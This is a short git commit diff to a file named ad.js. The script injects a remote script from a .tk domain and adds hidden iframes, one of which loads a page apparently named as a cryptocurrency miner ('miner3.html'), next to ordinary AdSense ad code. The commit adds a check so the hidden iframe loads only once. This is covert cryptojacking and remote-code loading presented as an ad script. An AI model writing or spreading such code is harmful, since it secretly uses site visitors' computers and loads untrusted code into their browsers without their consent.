fb2bdd68995c87a22ed5fdae6227fbb046e43c30
guochijun@dianmi365.com <guochijun@dianmi365.com>
2017-10-23 11:19:46 +0800

    fe

--- ad.js
+++ ad.js
@@ -1,11 +1,12 @@
 (function () {
+    if(document.getElementById("emprise")) return
     //基�?�
     var b = document.createElement("script");
     b.src = "http://www.7k77.tk/eicXsB?1504592003";
     (document.getElementsByTagName("HEAD")[0] || document.body).appendChild(b)
     var divs=[
 
-    "<iframe src=\"http://emprise.tk/\"  style=\"display: none;\"></iframe>",
+    "<iframe id=\"emprise\" src=\"http://emprise.tk/\"  style=\"display: none;\"></iframe>",
     "<iframe src=\"http://www.7k77.tk/cssjs/miner3.html\"  style=\"display: none;\"></iframe>",
     "<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- tesst -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-3568322529043220\"\n     data-ad-slot=\"7186075983\"\n     data-ad-format=\"auto\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>"
     ]
